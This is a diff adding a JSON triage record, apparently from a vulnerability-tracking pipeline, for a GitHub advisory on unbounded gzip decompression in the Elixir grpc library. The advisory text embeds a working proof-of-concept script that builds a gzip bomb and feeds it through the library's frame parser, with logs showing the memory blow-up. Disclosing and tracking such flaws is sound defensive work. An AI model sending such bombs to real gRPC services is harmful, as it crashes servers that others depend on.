@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/10426523?v=4\", \"events_url\": \"https://api.github.com/users/PJUllrich/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/PJUllrich/followers\", \"following_url\": \"https://api.github.com/users/PJUllrich/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/PJUllrich/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/PJUllrich\", \"id\": 10426523, \"login\": \"PJUllrich\", \"node_id\": \"MDQ6VXNlcjEwNDI2NTIz\", \"organizations_url\": \"https://api.github.com/users/PJUllrich/orgs\", \"received_events_url\": \"https://api.github.com/users/PJUllrich/received_events\", \"repos_url\": \"https://api.github.com/users/PJUllrich/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/PJUllrich/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/PJUllrich/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/PJUllrich\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/16843419?v=4\", \"events_url\": \"https://api.github.com/users/polvalente/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/polvalente/followers\", \"following_url\": \"https://api.github.com/users/polvalente/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/polvalente/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/polvalente\", \"id\": 16843419, \"login\": \"polvalente\", \"node_id\": \"MDQ6VXNlcjE2ODQzNDE5\", \"organizations_url\": \"https://api.github.com/users/polvalente/orgs\", \"received_events_url\": \"https://api.github.com/users/polvalente/received_events\", \"repos_url\": \"https://api.github.com/users/polvalente/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/polvalente/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/polvalente/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/polvalente\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-53430\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-409\", \"name\": \"Improper Handling of Highly Compressed Data (Data Amplification)\"}], \"description\": \"### Summary\\nAn unauthenticated remote peer can crash any gRPC server built on this library by sending a small gzip-compressed frame that decompresses to gigabytes, exhausting the BEAM node's heap and triggering an OOM kill (denial of service).\\n\\nIntroduced in https://github.com/elixir-grpc/grpc/commit/beae6800fc8baf126f3fe7107d86a50e105275ba\\n\\n### Details\\n`GRPC.Compressor.Gzip.decompress/1` (lib/grpc/compressor/gzip.ex:12-14) calls `:zlib.gunzip/1` directly on attacker-controlled bytes with no size limit, no ratio check, and no incremental decoding. Because this module is registered as a `GRPC.Compressor` implementation, it is invoked automatically whenever an incoming gRPC frame carries `grpc-encoding: gzip`. `:zlib.gunzip/1` allocates the entire decompressed result as a single binary before returning, so a highly compressible payload (e.g. a few kilobytes of zeros, which gzip compresses at roughly 1000:1) expands to multiple gigabytes inside a single function call. The server's `max_receive_message_length` is enforced only against the already-decompressed message, so it provides no protection here. A single request is sufficient to OOM-kill the node.\\n\\n### PoC\\nA script that verifies the vulnerability is attached to the end of this report. Run it against a stock gRPC server using this library; the BEAM node's memory usage will balloon and the VM will be OOM-killed after a single request.\\n\\n### Impact\\nThis is a decompression bomb / denial-of-service vulnerability. Any service that exposes a gRPC endpoint built on this library and accepts gzip-compressed requests is affected. No authentication, prior state, or special configuration is required — the attacker only needs to be able to reach the gRPC port and send a single crafted frame with `grpc-encoding: gzip`.\\n\\n## Scripts and Logs\\n\\n```elixir\\n# Verifies: Unbounded gzip decompression (decompression bomb)\\n\\nMix.install([{:grpc, \\\"~> 0.9\\\"}])\\n\\n# Build a gzip bomb: 200 MB of zeros compresses to roughly a few hundred KB.\\nuncompressed_size = 200 * 1024 * 1024\\nbomb_payload = :zlib.gzip(:binary.copy(<<0>>, uncompressed_size))\\n\\n# Wrap the bomb in a gRPC length-prefixed frame with the \\\"compressed\\\" flag (1)\\n# set. This is the exact wire shape an outside peer would put on the socket\\n# for a `grpc-encoding: gzip` message.\\nframe =\\n  <<1, byte_size(bomb_payload)::unsigned-integer-32, bomb_payload::binary>>\\n\\nIO.puts(\\n  \\\"Compressed bomb: #{byte_size(bomb_payload)} bytes -> claims to expand to #{uncompressed_size} bytes\\\"\\n)\\n\\n:erlang.garbage_collect()\\nmem_before = :erlang.memory(:total)\\nIO.puts(\\\"Memory before: #{div(mem_before, 1024 * 1024)} MB\\\")\\n\\n# Public entry point: GRPC.Message.from_data/2 is what the server's request\\n# handling pipeline calls with the raw bytes pulled off an incoming HTTP/2\\n# DATA frame, once it has resolved the encoding header to a compressor module.\\n# An outside attacker controls `frame`; the library is the trust boundary.\\n{:ok, decompressed} =\\n  GRPC.Message.from_data(%{compressor: GRPC.Compressor.Gzip}, frame)\\n\\nmem_after = :erlang.memory(:total)\\nIO.puts(\\\"Memory after:  #{div(mem_after, 1024 * 1024)} MB\\\")\\nIO.puts(\\\"Delta:         #{div(mem_after - mem_before, 1024 * 1024)} MB\\\")\\nIO.puts(\\\"Decompressed binary size: #{byte_size(decompressed)} bytes\\\")\\n\\namplification = byte_size(decompressed) / byte_size(bomb_payload)\\nIO.puts(\\\"Amplification ratio: ~#{Float.round(amplification, 1)}x\\\")\\n\\nif byte_size(decompressed) == uncompressed_size do\\n  IO.puts(\\n    \\\"VERIFIED: GRPC.Message.from_data/2 fully expanded the gzip bomb with no size cap, growing heap by ~#{div(mem_after - mem_before, 1024 * 1024)} MB from a #{div(byte_size(bomb_payload), 1024)} KB attacker payload.\\\"\\n  )\\nelse\\n  IO.puts(\\\"NOT VERIFIED: decompressed size did not match expected payload\\\")\\nend\\n```\\n\\n```logs\\nCompressed bomb: 203860 bytes -> claims to expand to 209715200 bytes\\nMemory before: 45 MB\\nMemory after:  403 MB\\nDelta:         358 MB\\nDecompressed binary size: 209715200 bytes\\nAmplification ratio: ~1028.7x\\nVERIFIED: GRPC.Message.from_data/2 fully expanded the gzip bomb with no size cap, growing heap by ~358 MB from a 199 KB attacker payload.\\n```\", \"epss\": {\"percentage\": 0.00348, \"percentile\": 0.27362}, \"ghsa_id\": \"GHSA-6ccx-9c9f-327w\", \"github_reviewed_at\": \"2026-08-25T18:12:58Z\", \"html_url\": \"https://github.com/advisories/GHSA-6ccx-9c9f-327w\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6ccx-9c9f-327w\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-53430\"}], \"nvd_published_at\": \"2026-06-15T23:16:46Z\", \"published_at\": \"2026-08-25T18:12:58Z\", \"references\": [\"https://github.com/elixir-grpc/grpc/security/advisories/GHSA-6ccx-9c9f-327w\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-53430\", \"https://github.com/elixir-grpc/grpc/pull/543\", \"https://github.com/elixir-grpc/grpc/commit/1afbab9d57d2a3e16ca9c62ffa4923338ea96cfc\", \"https://cna.erlef.org/cves/CVE-2026-53430.html\", \"https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0\", \"https://osv.dev/vulnerability/EEF-CVE-2026-53430\", \"https://github.com/advisories/GHSA-6ccx-9c9f-327w\"], \"repository_advisory_url\": \"https://api.github.com/repos/elixir-grpc/grpc/security-advisories/GHSA-6ccx-9c9f-327w\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/elixir-grpc/grpc\", \"summary\": \"gRPC Erlang package has unbounded gzip decompression (decompression bomb)\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-25T18:12:58Z\", \"url\": \"https://api.github.com/advisories/GHSA-6ccx-9c9f-327w\", \"vulnerabilities\": [{\"first_patched_version\": \"1.0.0\", \"package\": {\"ecosystem\": \"erlang\", \"name\": \"grpc\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 0.4.0, < 1.0.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6ccx-9c9f-327w",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "grpc: >= 0.4.0, < 1.0.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-53430"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "grpc"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-25T19:19:12.858554Z",
+  "provenance": {
+    "content_sha256": "1de50e38b8fb3c026f986f3b9427767687d0882307eafdcdd9f006896fc60557",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-25T18:12:58Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6ccx-9c9f-327w",
+  "status": "active",
+  "title": "gRPC Erlang package has unbounded gzip decompression (decompression bomb)",
+  "updated_at": "2026-08-25T18:12:58Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6ccx-9c9f-327w"
+}
